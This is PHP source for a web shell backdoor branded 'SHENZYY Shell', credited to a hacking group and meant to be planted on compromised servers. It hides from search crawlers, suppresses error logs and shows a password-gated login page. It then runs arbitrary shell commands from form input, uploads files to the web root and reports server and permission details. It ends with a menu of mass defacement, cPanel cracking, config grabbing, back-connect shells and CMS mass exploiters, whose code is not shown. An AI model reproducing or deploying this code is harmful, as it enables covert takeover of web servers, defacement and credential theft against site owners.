<?php

#######################
# SHENZYY                        #
# Coded By Err0r_HB 			#
# telegram: @anonyksxd          #
# instagram:@shenzyy001       #
# twitter:@sibersube              #
# Security? that just an illusion  #                 
# Lulz Ghost Team                #                 
#######################

session_start();
error_reporting(0);
set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shellbackdoor() {
?>
<html>
    
    <head>
        <link rel="SHORTCUT ICON" href="https://i.postimg.cc/Mpn6P0Wh/IMG-20230429-045808-277.jpg">
        <title>xXx::.SHENZYY Shell.::xXx</title>
            <style type="text/css">
            html {
                background: #000000;
                color: green;
            }
            
            header {
                color: green;
                margin: 10px auto;
            }
            
            input[type=password] {
                width: 250px;
                height: 25px;
                color: red;
                background: #000000;
                border: 1px solid #ffffff;
                padding: 5px;
                margin-left: 20px;
                text-align: center;
                transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
                -webkit-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
                -moz-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
                -ms-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
            }
            
            input[type=password]:focus {
                box-shadow: 0px 0px 5px #cc0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000, 0px 0px 35px #cc0000;
                border: 1px solid #ff0000;
            }
            
            </style>
    </head>
    <header>
        
        <center>
            <style type="text/css">
            #info-teja {
                z-index: 1000;
                background: -moz-linear-gradient(top, #1F2326, #555);
                background: -webkit-gradient(linear, left top, left bottom, from(#1F2326), to(#555));
                box-shadow: -2px -2px 8px #202020, 2px 2px 20px #202020;
                -moz-box-shadow: -2px -2px 8px #202020, 2px 2px 20px #202020;
                -webkit-box-shadow: -2px -2px 8px #202020, 2px 2px 20px #202020;
                width: 460px;
                position: fixed;
                top: 150px;
                left: 0;
                margin-left: -350px;
                border: 1px solid #444;
                background-position: top right no-repeat;
                height: 35px;
                font: 11px Orbitron;
                color: #eee;
                border-top-right-radius: 8px;
                border-bottom-right-radius: 8px;
                -moz-border-radius-topright: 8px;
                -moz-border-radius-bottomright: 8px;
                -webkit-border-top-right-radius: 8px;
                -webkit-border-bottom-right-radius: 8px;
            }
            
            #info-teja {
                -o-transition: all 1s ease-in;
                -moz-transition: all 1s ease-in;
                -webkit-transition: all 1s ease-in;
            }
            
            #info-teja:hover {
                width: 400px;
                opacity: 1.0;
                margin-left: 0;
            }
            
            .Tejainbox {
                border: 1px solid #444;
                width: 320px;
                margin: 0px 90px 10px 10px;
                background: #000;
                color: #ffffff;
                border-radius: 20px;
                padding: 5px 0;
                -moz-border-radius: 20px;
                -webkit-border-radius: 20px;
                -o-transition: all 2s ease-in;
                -moz-transition: all 2s ease-in;
                -webkit-transition: all 2s ease-in;
                opacity: 0.2;
            }
            
            .Tejainbox:hover {
                opacity: 1.0;
                box-shadow: 1px 1px 15px #000;
                -moz-box-shadow: 1px 1px 15px #000;
                -webkit-box-shadow: 1px 1px 15px #000;
                background: #000;
            }
            
            .Tejainbox2 {
                margin: 5px 10px;
                padding: 0px 8px 10px;
                color: #FFFFFF;
                overflow: hidden;
                height: 370px;
            }
            
            .teja15 {
                border-radius: 15px;
                -moz-border-radius: 15px;
                -webkit-border-radius: 15px;
            }
            
            .Teja2 ul.bom {
                margin: 0;
                padding: 0;
            }
            
            .Tejainbox2 li {
                margin-left: 20px;
            }
            
            .Tejainbox2 li a {
                color: #FFFFF;
                line-height: 4px;
                font-size: 11px;
                font-weight: bold;
                text-decoration: none;
            }
            
            .Tejainbox2 li a:hover {
                color: #428bca;
                text-shadow: 0 1px 1px #000;
            }
            
            .Tejainbox2 h2 {
                font: 18px Droid Serif;
                font-weight: bold;
                padding: 0 8px;
                color: #fffff;
                text-shadow: 0px 1px 1px #ddd;
                border-bottom: 1px solid #202020;
            }
            
            .Tejatouch {
                font-size: 21px;
                font-weight: bold;
                font-family: Arial Narrow;
                float: right;
                margin: 3px 10px 0 0;
                -o-transition: all 0.5s ease-out;
                -moz-transition: all 0.5s ease-out;
                -webkit-transition: all 0.5s ease-out;
                text-decoration: blink;
            }
            
            .Tejatouch:hover {
                -o-transform: scale(2) rotate(720deg) translate(0px);
                -moz-transform: scale(2) rotate(720deg) translate(0px);
                -webkit-transform: scale(2) rotate(720deg) translate(0px);
                color: #fffff;
            }
            
            </style>
            <pre>
<script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script>
</pre>
            <div id="info-teja"><span class="Tejatouch" style="font-family:orbitron;font-size:18px">Credits:</span>
                <div class="Tejainbox">
                    <div class="Tejainbox2 teja15">
                        <h2>
                            <center> [+] We Are [+]
                        </h2><br>
                        
                        <center>
                            <div id="contenttengah">
                                <center>
                                    <img title="SHENZYY" src="https://i.postimg.cc/Mpn6P0Wh/IMG-20230429-045808-277.jpg" width="70%">
                            </div>
                        </center>
                        
                        
                        <span class="style4"> Shell Owner: <br>SHENZYY</span><br><br>
                        <span class="style4">SHENZYY: <br>SQL47.ID</span><br><br>
                        <span class="style4">Official Member: <br>UnknownGho5t - Err0r_HB - Unknown1337 </span><br><br>
                        <span class="style4">Greetz : <br> AnonSec Team </span>
                    </div>
                </div>
            </div>
            </td>
            </div>
            
            <?php 

$ServerName = $_SERVER['SERVER_NAME'];

?>
            <style>
            @import url(http://fonts.googleapis.com/css?family=Iceland);
            
            </style>
            <font color="red" face="Iceland" size="6">SHENZYY Bypass</font><br><br><br>
            <font style="font: 15pt Verdana; color: red;">Welcome Hackers!!</font><br><br>
            <table align="center" border="1" width="600" heigh>
                <tbody>
                    <tr>
                        <td valign="top" background="http://dl.dropbox.com/u/10860051/images/matran.">
                            <p id="hack" style="margin-left: 3px;">
                                <font color="lime"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>
                                <font color="#FFF000"> Searching For Available Users . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
                                <font color="#FFF000"> Users Found : <font color='red'>root@SHENZYY:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font>
                                </font><br>
                                <font color="lime"> Connecting To Our Master ^_^ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
                                <font color="#F00000">
                                    <font color="#FFF000">root@SHENZYY:~$</font> Connected !
                                </font><br>
                                <font color="lime"> Detecting The Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
                                <font color="lime"> Server Detected <font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
                                <font color="lime"> Trying To Connect To The Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
                                <font color="#F00000">
                                    <font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> Connected !
                                </font><br>
                                <font color="#009900">
                                    <font color="#FFF000"><?php echo $ServerName.": ~$" ?></font>
                                    <font color="lime"> Checking Server Command . . . . . . . . . . . . . . . . . . .</font> <br>
                                    
                                    <font color="#009900">
                                        <font color="#FFF000"><?php echo $ServerName.": ~$" ?></font>
                                        <font color="lime"> Trying connect to Command . . . . . . . . . . .</font><br>
                                        
                                        <font color="#F00000">
                                            <font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> Connected Command!
                                        </font><br>
                                        <font color="red">root@SHENZYY:~$ </font>
                                        <font color="#FFF000"><?php echo "@". $ServerName ?><br></font>
                                        <font color="red">Ready To Fuck Server :p</font>
                    </tr>
                </tbody>
            </table>
            <br>
            
            <script type="text/javascript">
            new TypingText(document.getElementById("hack"), 30, function(i) {
                var ar = new Array("_", "");
                return " " + ar[i.length % ar.length];
            });
            TypingText.runAll();
            
            </script>
            
            
            </pre>
            
        </center>
    </header>
    <form method="post">
        <center><input type="password" name="pass">
            <center>
    </form><br><br>
    <font color="red" face="Verdana">Visit Us! : https://t.me/anonyksxd </font>
    <audio controls autoplay hidden>
        <source src="https://a.tumblr.com/tumblr_nc451eJAWg1tjcth4o1.mp3" type="audio/mpeg">
    </audio><br><br>
    <font color="red" face="Verdana">@CopyRights LulzGhost Team2023 </font>
    <?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shellbackdoor();
?>
    <html>
        
        <head>
            <link rel="SHORTCUT ICON" href="https://i.postimg.cc/y1397JJY/1680189610085.png">
            <title>xXx::. SHENZYY Shell .::xXxx</title>
            <meta name='author' content='SHENZYY'>
            <meta charset="UTF-8">
            <style type='text/css'>
            @import url(http://fonts.googleapis.com/css?family=Iceland);
            @import url("https://fonts.googleapis.com/css?family=Rajdhani");
            @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
            
            hr {
                border: 0;
                height: 1px;
                background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgb(255, 0, 0), rgba(0, 0, 0, 0))
            }
            
            html {
                background: #000000;
                color: #ffffff;
                font-family: 'Share Tech Mono';
                font-size: 13px;
                width: 100%;
            }
            
            li {
                display: inline;
                margin: 1px;
                padding: 1px;
            }
            
            #menu a {
                padding: 2px 10px;
                margin: 0;
                background: #222222;
                text-decoration: none;
                letter-spacing: 2px;
                padding: 2px 10px;
                margin: 0;
                background: #222222;
                text-decoration: none;
                letter-spacing: 2px;
                border-radius: 2px;
                border-bottom: 2px solid #e11a1a;
                border-top: 2px solid #e11a1a;
                border-right: 2px solid #e11a1a;
                border-left: 2px solid #e11a1a;
            }
            
            #menu a:hover {
                background: #180000;
                border-bottom: 0px solid #333333;
                border-top: 0px solid #333333;
            }
            
            table tr:first-child {
                background: black;
                text-align: center;
                color: red;
            }
            
            table,
            th,
            td {
                border-collapse: collapse;
                font-family: Tahoma, Geneva, sans-serif;
                background: transparent;
                font-family: 'Share Tech Mono';
                font-size: 13px;
            }
            
            .table_home,
            .th_home,
            .td_home {
                border: 0px solid red;
            }
            
            th {
                padding: 10px;
            }
            
            a {
                color: #ffffff;
                text-decoration: none;
            }
            
            a:hover {
                color: red;
                text-decoration: underline;
            }
            
            b {
                color: red;
            }
            
            input[type=text],
            input[type=password],
            input[type=submit] {
                background: transparent;
                color: #ffffff;
                border: 1px solid #ffffff;
                margin: 5px auto;
                padding-left: 5px;
                font-family: 'Share Tech Mono';
                font-size: 13px;
            }
            
            input[type=submit] {
                background: transparent;
                color: #ffffff;
                border: 1px solid #ffffff;
                margin: 5px auto;
                padding-left: 5px;
                font-family: 'Share Tech Mono';
                font-size: 13px;
                cursor: pointer;
            }
            
            textarea {
                border: 1px solid #ffffff;
                width: 100%;
                height: 400px;
                padding-left: 5px;
                margin: 10px auto;
                resize: none;
                background: transparent;
                color: #ffffff;
                font-family: 'Share Tech Mono';
                font-size: 13px;
            }
            
            select {
                width: 152px;
                background: #000000;
                color: red;
                border: 1px solid #ffffff;
                margin: 5px auto;
                padding-left: 5px;
                font-family: 'Share Tech Mono';
                font-size: 13px;
            }
            
            option:hover {
                background: red;
                color: #000000;
            }
            
            .mybox {
                -moz-border-radius: 10px;
                border-radius: 10px;
                border: 1px solid #ff0000;
                padding: 4px 2px;
                width: 70%;
                line-height: 24px;
                background: none;
                box-shadow: 0px 4px 2px white;
                -webkit-box-shadow: 0px 4px 2px #ff0000;
                -moz-box-shadow: 0px 4px 2px #ff0000;
            }
            
            .cgx2 {
                text-align: center;
                letter-spacing: 1px;
                font-family: "orbitron";
                color: #ff0000;
                font-size: 25px;
                text-shadow: 5px 5px 5px black;
            }
            
            .infoweb {
                border-right: 1px solid #00FFFF;
            }
            
            </style>
            <style type="text/css">
            @-webkit-keyframes spinner {
                from {
                    -webkit-transform: rotateY(0deg);
                }
                
                to {
                    -webkit-transform: rotateY(-360deg);
                }
            }
            
            @-ms-keyframes spinner {
                from {
                    -ms-transform: rotateY(0deg);
                }
                
                to {
                    -ms-transform: rotateY(-360deg);
                }
            }
            
            @-o-keyframes spinner {
                from {
                    -o-transform: rotateY(0deg);
                }
                
                to {
                    -o-transform: rotateY(-360deg);
                }
            }
            
            @keyframes spinner {
                from {
                    transform: rotateY(0deg);
                }
                
                to {
                    transform: rotateY(-360deg);
                }
            }
            
            @-moz-keyframes spinner {
                from {
                    -moz-transform: rotateY(0deg);
                }
                
                to {
                    -moz-transform: rotateY(-360deg);
                }
            }
            
            #stage {
                margin: 1em auto;
                -webkit-perspective: 1200px;
                -moz-perspective: 1200px;
                -ms-perspective: 1200px;
                perspective: 1200px;
            }
            
            #spinner,
            #spinner p {
                text-align: center;
                color: #fff;
                -webkit-animation-name: spinner;
                -webkit-animation-timing-function: linear;
                -webkit-animation-iteration-count: infinite;
                -webkit-animation-duration: 6s;
                
                -moz-animation-name: spinner;
                -moz-animation-timing-function: linear;
                -moz-animation-iteration-count: infinite;
                -moz-animation-duration: 6s;
                
                animation-name: spinner;
                animation-timing-function: linear;
                animation-iteration-count: infinite;
                animation-duration: 6s;
                
                -webkit-transform-style: preserve-3d;
                -moz-transform-style: preserve-3d;
                -ms-transform-style: preserve-3d;
                transform-style: preserve-3d;
            }
            
            #spinner:hover {
                -webkit-animation-play-state: paused;
                -moz-animation-play-state: paused;
                animation-play-state: paused;
            }
            
            .tabnet {
                margin: 15px auto 0 auto;
                border: 1px solid #333333;
            }
            
            .inputz {
                background: #111111;
                border: 0;
                padding: 2px;
                border-bottom: 1px solid #222222;
                border-top: 1px solid #222222;
            }
            
            .inputzbut {
                background: #111111;
                color: white;
                margin: 0 4px;
                border: 1px solid #444444;
                
            }
            
            .inputz:hover border-bottom:1px solid aqua;
            border-top:1px solid aqua;
            
            }
            
            .inputzbut:hover {
                border-bottom: 1px solid aqua;
                border-top: 1px solid aqua;
            }
            
            </style>
        </head>
        <?php

function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE; 
// change directory
if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}

function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}

function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}

error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$open_basedir = @ini_get("Open_Basedir");
$safemode_exec_dir = @ini_get("safe_mode_exec_dir");
$safemode_include_dir = @ini_get("safe_mode_include_dir");

$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$mssql = (function_exists('mssql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$pgsql = (function_exists('pg_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$magicquotes = (function_exists('get_magic_quotes_gpc')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$ssh2 = (function_exists('ssh2_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$oracle = (function_exists('oci_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>All Functions Is Accessible </font>";
$show_obdir = (!empty($open_basedir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
$show_exec = (!empty($safemode_exec_dir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
$show_include = (!empty($safemode_include_dir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<center>";
echo "<br>";
echo "<img src = 'https://i.postimg.cc/Mpn6P0Wh/IMG-20230429-045808-277.jpg' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>$ SHENZYY Shell $</font>";
echo "&emsp;";
echo "<img src = 'https://i.postimg.cc/Mpn6P0Wh/IMG-20230429-045808-277.jpg' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>Failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		}
	}
	echo "
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Normal [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
echo "<hr color='red'></font></center>";
echo "<pre>";
echo "Server IP 		: <font color = 'red'>".$_SERVER['SERVER_ADDR']. "</font> Your IP :<font color ='red'> ".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Software 		: <font color = 'lime'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "Kernel Version 		: <font color = 'lime'>".php_uname()."</font><br>";
echo "Storage Space 		: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "User / Group 		: <font color = 'lime'>".$user." (".$uid.") | ".$group." (".$gid.")</font><br>";
echo "Time On Server 		: <font color = 'lime'>".date("d M Y h:i:s a"). "</font><br>";
echo "Disable Functions 	: $show_ds<br>";
echo "Safe Mode 		: $sm<br>";
echo "PHP Version 		: <font color = 'lime'>".phpversion()." On ".php_sapi_name()."</font><br><br>";
echo "Open_Basedir: $show_obdir | Safe Mode Exec Dir: $show_exec | Safe Mode Include Dir: $show_include |  <br>";
echo "MySQL: $mysql | MSSQL: $mssql | PostgreSQL: $pgsql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl | Magic Quotes: $magicquotes | SSH2: $ssh2 | Oracle: $oracle |  <br>";

echo "</pre>";
echo "<form method='post'>
	<font color = 'red'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).": ~ $ </font>&nbsp;
	<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' size='30' height='10' name='cmd'><input style='border: none; border-bottom: 1px solid #ffffff;' type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}		
echo "</td></table>";
echo "<div id='menu'>";
echo "<hr color='red'>";
echo "<center>";
echo "<ul>";
echo "<li><a href='?' style = 'color:red';>Home</a></li>";
echo "<li> <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> </li>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";
echo "<li> <a href='?dir=$dir&do=configv2'>Config V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=symlink'>Symlink</a></li>";
echo "<li> <a href='?dir=$dir&do=symlink2'>Symlink V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=symlink_python'>Symlink Python</a> </li>";
echo "<li> <a href='?dir=$dir&do=symconfig'>SymConfig</a> </li>";
echo "<li> <a href='?dir=$dir&do=adminer'>Adminer</a> </li> ";
echo "<li> <a href='?dir=$dir&do=grabcpanel'>Grab Cpanel</a> </li>";
echo "<li> <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
echo "<li> <a href='?dir=$dir&do=defacerid'>Defacer.id</a> </li>";
echo "<li> <a href='?dir=$dir&do=multiconfig'>Multi Config</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgi'>CGI Perl</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgi2'>CGI Perl 2</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgipy'>CGI Python</a> </li>";
echo "<li> <a href='?dir=$dir&do=network'>Back Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=backconnect'>Back Connect V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=jumping'>Jumping</a> </li>";
echo "<li> <a href='?dir=$dir&do=fake_root'>Fake Root</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=auto_dwp'>Wp Auto Deface</a> </li>";
echo "<li> <a href='?dir=$dir&do=auto_dwp2'>Wp Auto Deface V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=auto_wp'>Wp Auto Edit Title</a> </li>";
echo "<li> <a href='?dir=$dir&do=hijack_wp'>Wp Auto Hijack</a> </li>";
echo "<li> <a href='?dir=$dir&do=jodexer'>Joomla Auto Deface</a></li>";
echo "<li> <a href='?dir=$dir&do=cpftp_auto'>Cpanel/Ftp Auto Deface</a></li>";
echo "<li> <a href='?dir=$dir&do=whois'>Whois</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=csrfup'>Csrf Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=revslider'>RevSlider Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=elfinder'>Elfinder Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=lokomedia'>Lokomedia Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=drupal'>Drupal Mass Exploiter</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=ngindexx'>NginDexer</a> </li>";
echo "<li> <a href='?dir=$dir&do=vb'>VB Index Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> </li>";
echo "<li> <a href='?dir=$dir&do=netsploit'>NetSploit</a> </li>";
echo "<li> <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> </li>";
